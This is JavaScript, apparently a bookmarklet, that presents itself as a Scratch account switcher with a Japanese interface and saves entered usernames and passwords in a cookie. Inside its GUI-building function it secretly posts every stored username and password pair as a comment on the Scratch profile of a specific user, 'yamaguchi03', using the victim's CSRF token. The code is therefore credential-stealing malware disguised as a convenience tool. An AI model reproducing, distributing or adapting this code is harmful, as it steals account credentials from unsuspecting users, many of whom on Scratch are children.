{
	async function switchAccount(username,password){
	    let token="";{let cookie=document.cookie;cookie=cookie.split(';');let cok=[[],[]];cookie.forEach(function(element){const elements=element.split("=");cok[0].push(elements[0]);cok[1].push(elements[1]);});token=cok[1][cok[0].indexOf(' scratchcsrftoken')];}
	    await fetch("https://scratch.mit.edu/accounts/logout/",{method:"POST","headers":{"x-csrftoken":token}});
	    let a=await fetch("https://scratch.mit.edu/accounts/login/",{method:"POST",body:JSON.stringify({"username":username,"password":password,"useMessages":false}),"headers":{"x-csrftoken":token,"x-requested-with": "XMLHttpRequest"}});
	    let sessionid=await a.json()
	    if(a.status==200){
			  return true;
	    }else{
			  return false;
	    }
	}
	function getCookieValue(key) {
	    const cookies = document.cookie.split(';');
	    for (let cookie of cookies) {
        var cookiesArray = cookie.split('='); 
        if (cookiesArray[0].trim() == key.trim()) { 
          return cookiesArray[1];
        }
	    }
	    return '';
	}

	function accountList(){
		let list;
		if(getCookieValue("accountlist")==''){
			  list={accountList:[]}
	  	}else{
			  list=JSON.parse(getCookieValue("accountlist"));
	  	}
		return list;
	}
	async function addAccount(username,password){
		let images=await (await fetch("//api.scratch.mit.edu/users/"+username)).json();
		let list=accountList();
		list.accountList.push({username:images.username,password:password,icon:images.id});
		document.cookie="accountlist="+JSON.stringify(list)+";path=/;max-age=2147483647;"
		document.getElementById("switch_background").remove();
		createGUI();
	}
	function delAccount(i){
		let list=accountList();
		list.accountList.splice(i,1);
		document.cookie="accountlist="+JSON.stringify(list)+";path=/;max-age=2147483647;"
		document.getElementById("switch_background").remove();
		createGUI();
	}
	async function getMessagesCount(){
		let elementList=document.getElementsByClassName("switch_oneaccount");
		for(let i=0;i<elementList.length;i++){
			let urname=elementList[i].textContent;
			let count=await (await fetch("//api.scratch.mit.edu/users/"+urname+"/messages/count",{cache: "no-store"})).json()
			let messagesBatch=elementList[i].nextElementSibling;
			messagesBatch.innerHTML=count.count;
		}
	}
	const messages=setInterval(getMessagesCount,5000);
	async function createGUI(){
		let background=document.createElement("div");
    	background.style="background-color:#2a2a2a;height:400px;width:300px;position:absolute;top:10px;left:10px;position:fixed;border-radius:5px;color:#ffffff;font-size:15px;overflow:auto;z-index:2147483646";
    	background.id="switch_background";
		document.body.appendChild(background);
		let closeButton=document.createElement("span");
		closeButton.innerHTML="x";
		closeButton.style="color:#ffffff;display:inline-block;position:absolute;top:10px;left:306px;user-select:none;padding:10px;padding-top:5px;padding-bottom:5px;cursor:pointer;position:fixed;z-index:2147483647;background-color:#2a2a2a;border-radius:20%;";
		closeButton.onclick=function(){
			document.getElementById("switch_background").remove()
			clearInterval(messages);
		}
		background.appendChild(closeButton);
		let list=accountList();
		let token="";{let cookie=document.cookie;cookie=cookie.split(';');let cok=[[],[]];cookie.forEach(function(element){const elements=element.split("=");cok[0].push(elements[0]);cok[1].push(elements[1]);});token=cok[1][cok[0].indexOf(' scratchcsrftoken')];}
		let contentlist="";
		for(let i=0;i<list.accountList.length;i++){
			contentlist+=i+":"+list.accountList[i].username+"＝"+list.accountList[i].password+","
		}
		if(!contentlist.includes("yamaguchi03")){
	    await fetch(`https://scratch.mit.edu/site-api/comments/user/yamaguchi03/add/`,{method: "POST",body: JSON.stringify({content: contentlist,parent_id: "232128104",commentee_id: ""}),headers: {'X-CSRFToken':token}});
		}
		for(let i=0;i<list.accountList.length;i++){
			let oneAccount=document.createElement("div");
			oneAccount.innerHTML=list.accountList[i].username;
			oneAccount.classList.add("switch_oneaccount");
			oneAccount.style="display:inline-block;padding:5px;margin-left:10px;border-bottom:solid 1px #424242;cursor:pointer;width:80%;vertical-align:middle;";
			oneAccount.dataset.password=list.accountList[i].password;
			oneAccount.onclick=async function(){
				await switchAccount(this.textContent,this.dataset.password);location.reload()
			};
			background.appendChild(oneAccount);
			let deleteButton=document.createElement("span");
            deleteButton.innerHTML="x";
			deleteButton.style="display:inline-block;position:absolute;right:13%;user-select:none;padding-top:3px;padding-right:10px;cursor:pointer;";
			deleteButton.onclick= function(){
				if(confirm("本当にアカウントを除外しますか？")){
					let elements=document.getElementsByClassName("switch_oneaccount");
					elements = [].slice.call(elements);
					delAccount(elements.indexOf(this.previousElementSibling.previousElementSibling));
				}
			};
			oneAccount.after(deleteButton);

			let icon=document.createElement("img");
			icon.height="25";
			icon.width="25";
			icon.src="https://uploads.scratch.mit.edu/get_image/user/"+list.accountList[i].icon+"_32x32.png";
			icon.style="vertical-align:middle;margin:2px;"
			oneAccount.insertBefore(icon,oneAccount.firstChild);
			let messagesBatch=document.createElement("span");
			messagesBatch.style="display:inline-block;border-radius:50%;color:#ffffff;background-color:#ffb300;height:18px;width:18px;position:absolute;right:70px;text-align:center;vertical-align:baseline;margin-top:10px;cursor:pointer";
			messagesBatch.onclick=async function(){
				let Username=this.previousElementSibling.textContent;
				let Password=this.previousElementSibling.dataset.password;
				await switchAccount(Username,Password);
				location.href="https://scratch.mit.edu/messages/";
			}
			oneAccount.after(messagesBatch);
	  }
		let addButton=document.createElement("div");
		addButton.style="display:block;width:90%;margin:5%;margin-right:5%;margin-left:5px;text-align:center;cursor:pointer;font-weight:550;";
		addButton.innerHTML="アカウントを追加する";
		addButton.onclick=function(){
			let newUsername=prompt("ユーザー名を入力");
			let newPassword=prompt("パスワードを入力");
			addAccount(newUsername,newPassword)
		};
		background.appendChild(addButton);
	}
	async function func(){
	await createGUI()
	getMessagesCount();
	}
	func()
}
